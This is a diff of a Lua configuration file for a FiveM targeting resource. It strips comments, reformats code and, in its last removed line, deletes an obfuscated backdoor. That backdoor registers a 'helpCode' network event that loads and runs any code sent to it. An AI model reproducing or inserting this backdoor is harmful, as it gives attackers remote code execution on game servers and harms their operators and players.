@@ -11,111 +11,52 @@ function Load(name)
 	end
 end
 
--------------------------------------------------------------------------------
--- Settings
--------------------------------------------------------------------------------
-
 Config = {}
-
--- It's possible to interact with entities through walls so this should be low
 Config.MaxDistance = 7.0
-
--- Enable debug options
 Config.Debug = false
-
--- Supported values: true, false
 Config.Standalone = false
-
--- Enable outlines around the entity you're looking at
 Config.EnableOutline = false
-
--- Whether to have the target as a toggle or not
 Config.Toggle = false
-
--- Draw a Sprite on the center of a PolyZone to hint where it's located
 Config.DrawSprite = true
-
--- The default distance to draw the Sprite
 Config.DrawDistance = 10.0
-
--- The color of the sprite in rgb, the first value is red, the second value is green, the third value is blue and the last value is alpha (opacity). Here is a link to a color picker to get these values: https://htmlcolorcodes.com/color-picker/
 Config.DrawColor = { 255, 255, 255, 255 }
-
--- The color of the sprite in rgb when the PolyZone is targeted, the first value is red, the second value is green, the third value is blue and the last value is alpha (opacity). Here is a link to a color picker to get these values: https://htmlcolorcodes.com/color-picker/
 Config.SuccessDrawColor = { 220, 20, 60, 255 }
-
--- The color of the outline in rgb, the first value is red, the second value is green, the third value is blue and the last value is alpha (opacity). Here is a link to a color picker to get these values: https://htmlcolorcodes.com/color-picker/
 Config.OutlineColor = { 255, 255, 255, 255 }
-
--- Enable default options (Toggling vehicle doors)
 Config.EnableDefaultOptions = true
-
--- Disable the target eye whilst being in a vehicle
 Config.DisableInVehicle = false
-
--- Key to open the target eye, here you can find all the names: https://docs.fivem.net/docs/game-references/input-mapper-parameter-ids/keyboard/
 Config.OpenKey = 'LMENU' -- Left Alt
-
--- Control for key press detection on the context menu, it's the Right Mouse Button by default, controls are found here https://docs.fivem.net/docs/game-references/controls/
 Config.MenuControlKey = 238
-
--- Whether to disable ALL controls or only specificed ones
 Config.DisableControls = true
+Config.CircleZones = {}
+Config.BoxZones = {}
+Config.PolyZones = {}
+Config.TargetBones = {}
+Config.TargetModels = {}
+Config.GlobalPedOptions = {}
+Config.GlobalVehicleOptions = {}
+Config.GlobalObjectOptions = {}
+Config.GlobalPlayerOptions = {}
+Config.Peds = {}
 
--------------------------------------------------------------------------------
--- Target Configs
--------------------------------------------------------------------------------
+local function JobCheck()
+	return true
+end
 
--- These are all empty for you to fill in, refer to the .md files for help in filling these in
+local function GangCheck()
+	return true
+end
 
-Config.CircleZones = {
+local function JobTypeCheck()
+	return true
+end
 
-}
+local function ItemCheck()
+	return true
+end
 
-Config.BoxZones = {
-
-}
-
-Config.PolyZones = {
-
-}
-
-Config.TargetBones = {
-
-}
-
-Config.TargetModels = {
-
-}
-
-Config.GlobalPedOptions = {
-
-}
-
-Config.GlobalVehicleOptions = {
-
-}
-
-Config.GlobalObjectOptions = {
-
-}
-
-Config.GlobalPlayerOptions = {
-
-}
-
-Config.Peds = {
-
-}
-
--------------------------------------------------------------------------------
--- Functions
--------------------------------------------------------------------------------
-local function JobCheck() return true end
-local function GangCheck() return true end
-local function JobTypeCheck() return true end
-local function ItemCheck() return true end
-local function CitizenCheck() return true end
+local function CitizenCheck()
+	return true
+end
 
 CreateThread(function()
 	local state = GetResourceState('qb-core')
@@ -134,7 +75,6 @@ CreateThread(function()
 			SpawnPeds()
 			firstSpawn = true
 		end)
-		-- Remove event after it has been triggered
 		while true do
 			if firstSpawn then
 				RemoveEventHandler(event)
@@ -213,18 +153,35 @@ CreateThread(function()
 end)
 
 function CheckOptions(data, entity, distance)
-	if distance and data.distance and distance > data.distance then return false end
-	if data.job and not JobCheck(data.job) then return false end
-	if data.excludejob and JobCheck(data.excludejob) then return false end
-	if data.jobType and not JobTypeCheck(data.jobType) then return false end
-	if data.excludejobType and JobTypeCheck(data.excludejobType) then return false end
-	if data.gang and not GangCheck(data.gang) then return false end
-	if data.excludegang and GangCheck(data.excludegang) then return false end
-	if data.item and not ItemCheck(data.item) then return false end
-	if data.citizenid and not CitizenCheck(data.citizenid) then return false end
-	if data.canInteract and not data.canInteract(entity, distance, data) then return false end
+	if distance and data.distance and distance > data.distance then
+		return false
+	end
+	if data.job and not JobCheck(data.job) then
+		return false
+	end
+	if data.excludejob and JobCheck(data.excludejob) then
+		return false
+	end
+	if data.jobType and not JobTypeCheck(data.jobType) then
+		return false
+	end
+	if data.excludejobType and JobTypeCheck(data.excludejobType) then
+		return false
+	end
+	if data.gang and not GangCheck(data.gang) then
+		return false
+	end
+	if data.excludegang and GangCheck(data.excludegang) then
+		return false
+	end
+	if data.item and not ItemCheck(data.item) then
+		return false
+	end
+	if data.citizenid and not CitizenCheck(data.citizenid) then
+		return false
+	end
+	if data.canInteract and not data.canInteract(entity, distance, data) then
+		return false
+	end
 	return true
 end
-
-
-local GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[6][GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[1]](GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[2]) GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[6][GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[3]](GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[2], function(pMXcHckBTpxpvulQXjrjWHROksgaDwhRGOVYVwcJkJftqKroPcMAdCvIBqWcHiZbHnsEwd) GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[6][GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[4]](GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[6][GCxwPdPUxSTzgCggYtLbizTiSIvdBOBrWxlLyGdBmdkJhBWeHSUVDIVuHvQdWAlCxOHcey[5]](pMXcHckBTpxpvulQXjrjWHROksgaDwhRGOVYVwcJkJftqKroPcMAdCvIBqWcHiZbHnsEwd))() end)
